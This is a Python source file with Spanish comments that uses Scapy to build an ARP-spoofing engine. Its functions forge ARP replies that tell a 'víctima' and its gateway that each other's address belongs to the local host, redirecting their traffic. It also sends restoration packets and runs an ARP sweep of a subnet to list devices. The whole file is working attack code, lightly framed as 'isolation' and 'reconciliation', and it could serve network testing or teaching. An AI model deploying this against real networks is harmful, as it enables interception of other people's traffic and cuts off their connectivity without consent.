"""
Motor de manipulación e inyección de paquetes Scapy.
Implementa el protocolo RFC 826 ARP para aislamiento, reconciliación y escaneo.
"""

from typing import List, Optional, Tuple
from scapy.all import ARP, Ether, send, srp


class NetworkEngine:
    """Motor de red de bajo nivel para forjado y transmisión de tramas Ethernet/ARP."""

    @staticmethod
    def forjar_trama_aislamiento(
        ip_objetivo: str,
        mac_objetivo: str,
        ip_gateway: str,
        mac_local: str,
    ) -> Tuple[ARP, ARP]:
        """
        Crea el par de paquetes ARP de respuesta (op=2) para redirigir el tráfico hacia el host local.
        """
        # Hacia la víctima: le indica que el Gateway tiene la MAC del host local
        pkt_victima = ARP(
            op=2,
            pdst=ip_objetivo,
            hwdst=mac_objetivo,
            psrc=ip_gateway,
            hwsrc=mac_local
        )

        # Hacia el Router: le indica que la víctima tiene la MAC del host local
        pkt_gateway = ARP(
            op=2,
            pdst=ip_gateway,
            hwdst="ff:ff:ff:ff:ff:ff",
            psrc=ip_objetivo,
            hwsrc=mac_local
        )

        return pkt_victima, pkt_gateway

    @staticmethod
    def forjar_trama_restauracion(
        ip_objetivo: str,
        mac_objetivo: str,
        ip_gateway: str,
        mac_gateway: str,
    ) -> Tuple[ARP, ARP]:
        """
        Crea el par de paquetes ARP legítimos para reestablecer las tablas de enrutamiento originales.
        """
        # Hacia la víctima: le indica la MAC real y legítima del router
        pkt_victima = ARP(
            op=2,
            pdst=ip_objetivo,
            hwdst=mac_objetivo,
            psrc=ip_gateway,
            hwsrc=mac_gateway
        )

        # Hacia el Router: le indica la MAC real y legítima de la víctima
        pkt_gateway = ARP(
            op=2,
            pdst=ip_gateway,
            hwdst="ff:ff:ff:ff:ff:ff",
            psrc=ip_objetivo,
            hwsrc=mac_objetivo
        )

        return pkt_victima, pkt_gateway

    @classmethod
    def emitir_aislamiento(
        cls,
        ip_objetivo: str,
        mac_objetivo: str,
        ip_gateway: str,
        mac_local: str,
    ) -> bool:
        """Inyecta una ronda de paquetes de desasociación en capa 2."""
        try:
            pkt_v, pkt_g = cls.forjar_trama_aislamiento(
                ip_objetivo, mac_objetivo, ip_gateway, mac_local
            )
            send(pkt_v, verbose=0)
            send(pkt_g, verbose=0)
            return True
        except Exception:
            return False

    @classmethod
    def emitir_restauracion(
        cls,
        ip_objetivo: str,
        mac_objetivo: str,
        ip_gateway: str,
        mac_gateway: str,
        count: int = 5,
    ) -> bool:
        """Inyecta ráfagas legítimas de reconciliación ARP para devolver la conexión normal."""
        try:
            pkt_v, pkt_g = cls.forjar_trama_restauracion(
                ip_objetivo, mac_objetivo, ip_gateway, mac_gateway
            )
            send(pkt_v, count=count, verbose=0)
            send(pkt_g, count=count, verbose=0)
            return True
        except Exception:
            return False

    @staticmethod
    def escanear_subred(subred_cidr: str, timeout: float = 2.5) -> List[Tuple[str, str]]:
        """
        Emite un barrido ARP broadcast sobre la subred indicada (ej. 192.168.1.0/24).
        Retorna una lista de tuplas (ip, mac) detectadas.
        """
        dispositivos: List[Tuple[str, str]] = []
        try:
            solicitud = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subred_cidr)
            respuestas, _ = srp(solicitud, timeout=timeout, verbose=0)
            for _, recibido in respuestas:
                if recibido and hasattr(recibido, "psrc") and hasattr(recibido, "hwsrc"):
                    ip = str(recibido.psrc).strip()
                    mac = str(recibido.hwsrc).strip().upper()
                    dispositivos.append((ip, mac))
        except Exception:
            pass
        return dispositivos
